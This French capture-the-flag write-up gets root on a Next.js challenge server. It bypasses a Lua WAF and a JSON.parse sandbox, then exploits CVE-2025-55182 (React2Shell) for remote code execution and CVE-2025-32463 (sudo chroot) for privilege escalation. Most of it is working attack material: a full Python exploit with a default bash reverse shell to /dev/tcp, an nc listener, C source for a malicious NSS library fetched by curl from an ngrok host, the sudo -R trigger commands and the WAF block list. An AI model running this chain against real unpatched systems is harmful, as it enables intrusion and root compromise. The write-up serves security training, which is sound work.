## Recettes d'une bonne année 2/2

## Informations du challenge

| Catégorie | Difficulté | Points | Auteur |
|-----------|------------|--------|--------|
| Web | Difficile | 500 | bUst4gr0 |

**Preuve :** `CTE{Ch'35t_b0n_Ma1s-Ch'e5t_Ch4uD}`

## Contexte

Nous disposons du mot de passe admin récupéré en partie 1
(ou on donne l'identifiant `admin/!!!!Sweet!!!!` dans l'énoncé, par exemple, si la partie 1 est refusée ou manquante).

L'application web tourne derrière nginx, qui expose deux couches :
- Les pages statiques publiques (HTML direct)
- Tout le reste, proxifié vers une app Next.js, protégé par Basic Auth + WAF Lua

En accédant au site, la première chose que l'on remarque est le bouton « Espace Client » désactivé.

Au clic, il affiche :

> *« Dans le cadre de notre politique de sécurité, nous procédons régulièrement à des rotations de nos environnements clients.
L'espace client sera de nouveau disponible prochainement. »*

Ce message corporatif laisse entendre que l'application a été modifiée précipitamment :
l'admin a visiblement tenté de dissimuler quelque chose sans pour autant patcher correctement le serveur.
On cherche à comprendre ce qui se cache derrière.

---

## Étape 1 — Identification de la version Next.js

On visite une URL inexistante et on s'authentifie avec les credentials récupérés (`admin` / `!!!!Sweet!!!!`)
pour atteindre le serveur Next.js et déclencher le rendu d'une page 404 :

```bash
curl -s -u 'admin:!!!!Sweet!!!!' http://<ip>:<port>/inexistant
```

Un proxy web (en mode passif) ou l'inspection manuelle des chunks JS chargés par la 404 révèle, dans l'un d'eux :

```javascript
window.next={version:"16.0.6",appDir:!0}
```

**Version identifiée : Next.js 16.0.6** — comprise dans la plage 16.0.0–16.0.6, vulnérable à **CVE-2025-55182 (React2Shell)**.

---

## Étape 2 — CVE-2025-55182 : RCE via React Server Components

### La vulnérabilité

CVE-2025-55182 est une désérialisation non sécurisée dans le protocole RSC Flight de React 19.

Une requête POST malveillante avec le header `Next-Action` amène le serveur
à désérialiser un payload contrôlé par l'attaquant et à exécuter du JavaScript arbitraire côté serveur.

Cet exploit ne nécessite pas d'authentification préalable (à part le Basic Auth nginx ajouté par l'admin).

En cherchant à exploiter le CVE-2025-55182, on découvre que deux couches de hardening ont été mises en place,
vraisemblablement pour tenter de mitiger la vulnérabilité sans patcher Next.js :

### Le WAF Lua

Nginx intercepte les corps de requêtes et bloque les strings suivantes :

```
+  %  `  \x  \u  spawn_sync  child_process  /dev/tcp  bin  bash  sh  import
```

### Le sandbox Next.js

En plus du WAF, un sandbox Node.js (`sandbox.js`) est chargé via `NODE_OPTIONS=-r /app/sandbox.js`
et surcharge/redéfinit `JSON.parse` pour bloquer une série de patterns supplémentaires.

| Layer | Pattern bloqué | Bypass tenté (bloqué) |
|-------|----------------|----------------------|
| L1 | mainModule | `process["mainModule"]` ❌ |
| L2 | require( | `process["mainModule"]["require"]` ❌ |
| L3 | process.binding | `process["binding"]` ❌ |
| L4 | binding | `\u0062inding` unicode escape ❌ |
| L5a | fromCharCode | `atob('YmluZGluZw==')` ❌ |
| L5b | atob | `Buffer.from([...]).toString()` ❌ |
| L5c | Buffer. / Buffer[ | `new Uint8Array([...])` ❌ |
| L5d | /new\s+Uint\d+/ | `['bi','nding'].join('')` ❌ |
| L5e | join | `decodeURIComponent('%62inding')` ❌ |
| L5f | decodeURI / unescape | `\x62inding` hex escape ❌ |
| **L5g** | décodage `\xXX` | **`Uint8Array.from([98,105,110,100,105,110,103])`** ← solution ✅ |

`Uint8Array.from()` n'est pas bloqué — c'est l'une des seules primitives restantes pour construire des strings arbitraires.

Combinée à `TextDecoder.decode()`,
elle permet de reconstruire n'importe quel string interdit à partir de tableaux d'entiers.

### Bypass via TextDecoder

On encode chaque string interdite (par le WAF nginx **et** le sandbox) en tableau d'entiers,
puis on la reconstruit avec `TextDecoder` + `Uint8Array.from()` :
aucune des strings interdites n'apparaît en clair dans le corps de la requête,
et `Uint8Array.from()` est l'une des seules primitives non bloquées par le sandbox.

### Exploit

```python
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL   = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/ne"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
ACTION_ID  = sys.argv[3] if len(sys.argv) > 3 else "x"
AUTH_USER  = sys.argv[4] if len(sys.argv) > 4 else "admin"
AUTH_PASS  = sys.argv[5] if len(sys.argv) > 5 else "!!!!Sweet!!!!"

def enc(s):
    return list(s.encode())

binding   = enc('binding') # [98, 105, 110, 100, 105, 110, 103]
spwn      = enc('spawn_sync')
shell     = enc('bash')
shell_cmd = enc(EXECUTABLE)
path_env  = enc('PATH=/usr/local/bin:/usr/bin:/bin')
home_env  = enc('HOME=/tmp')
cwd_enc   = enc('/tmp')

prefix = f"""
var b    = new TextDecoder().decode(Uint8Array.from({binding}));
var s    = new TextDecoder().decode(Uint8Array.from({spwn}));
var x    = new TextDecoder().decode(Uint8Array.from({shell}));
var cmd  = new TextDecoder().decode(Uint8Array.from({shell_cmd}));
var env1 = new TextDecoder().decode(Uint8Array.from({path_env}));
var env2 = new TextDecoder().decode(Uint8Array.from({home_env}));
var cwd  = new TextDecoder().decode(Uint8Array.from({cwd_enc}));
var r = process[b](s).spawn({{
  file: x, args: [x, '-c', cmd],
  envPairs: [env1, env2],
  cwd: cwd, detached: false,
  windowsHide: false, windowsVerbatimArguments: false,
  killSignal: 15, maxBuffer: 1048576, timeout: 5000,
  stdio: [
    {{type: 'pipe', readable: true,  writable: false}},
    {{type: 'pipe', readable: false, writable: true}},
    {{type: 'pipe', readable: false, writable: true}}
  ]
}});
var o1 = r.output[1] ? r.output[1].toString() : '';
throw Object.assign(new Error('NEXT_REDIRECT'), {{digest: o1}});
"""

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": prefix,
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": ACTION_ID}
res = requests.post(BASE_URL, files=files, headers=headers,
                    auth=(AUTH_USER, AUTH_PASS), timeout=10)
print(res.status_code)
print(res.text)
```

On lance un listener et on exécute l'exploit :

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — exploit
python3 exploit.py "http://<ip>:<port>/"
```

On obtient un reverse shell en tant que `nextjs` (uid=1001).

---

## Étape 3 — CVE-2025-32463 : Privesc sudo chroot to root

### La vulnérabilité

sudo 1.9.16p2 est installé depuis les sources upstream — vulnérable à CVE-2025-32463. Dans les versions 1.9.14 à 1.9.17,
sudo effectue le chroot dans le répertoire spécifié par `-R` **avant** d'évaluer le fichier sudoers.

Il charge alors `/etc/nsswitch.conf` depuis ce répertoire contrôlé par l'attaquant,
ce qui permet de lui faire charger une bibliothèque NSS malveillante avec les privilèges root.

Le binaire sudo étant installé avec le bit SUID,
n'importe quel utilisateur local peut l'invoquer — même `nextjs` en /sbin/nologin et sans être sudoers.

**Vérification de la vulnérabilité :**

```bash
sudo -R lo0l l0ol
# → sudo: lo0l: No such file or directory  ← VULNÉRABLE
# → sudo: you are not permitted to use the -R option  ← patché
```

### Préparation sur sa propre machine

Le container n'a pas de compilateur — il faut cross-compiler la bibliothèque malveillante localement :

```c
// woot1337.c
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
```

```bash
gcc -shared -fPIC -nostartfiles -o woot1337.so.2 woot1337.c
```

On sert la lib via un serveur HTTP :

```bash
ngrok http file:///path_of_folder_to_serve <port>
```

### Exploitation sur la cible

Depuis le reverse shell `nextjs` :

```bash
# Préparer le faux environnement chroot
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

# Télécharger la lib malveillante
curl https://<ngrok-url>/woot1337.so.2 -o libnss_/woot1337.so.2

# Déclencher l'exploit
sudo -R woot woot
```

sudo chroot dans `woot/`, charge `woot/etc/nsswitch.conf`,
découvre le service `/woot1337`, charge `libnss_/woot1337.so.2` avec les privilèges root,
la fonction constructeur s'exécute et spawn un shell bash root.

### Flag

```bash
id
# uid=0(root) gid=0(root) groups=0(root),1001(nextjs)

cat /flag
# CTE{Ch'35t_b0n_Ma1s-Ch'e5t_Ch4uD}
```

---

## Résumé

| Étape | Outil | Résultat |
|-------|-------|----------|
| Fingerprint | ZAP / curl + chunks JS | Next.js 16.0.6 identifié |
| RCE | CVE-2025-55182 + bypass TextDecoder | Shell `nextjs` (uid=1001) |
| Transfert lib | curl + ngrok | `woot1337.so.2` sur la cible |
| Privesc | CVE-2025-32463 sudo -R | Shell root (uid=0) |
| Flag | cat /flag | `CTE{Ch'35t_b0n_Ma1s-Ch'e5t_Ch4uD}` |

✅ Preuve : `CTE{Ch'35t_b0n_Ma1s-Ch'e5t_Ch4uD}`
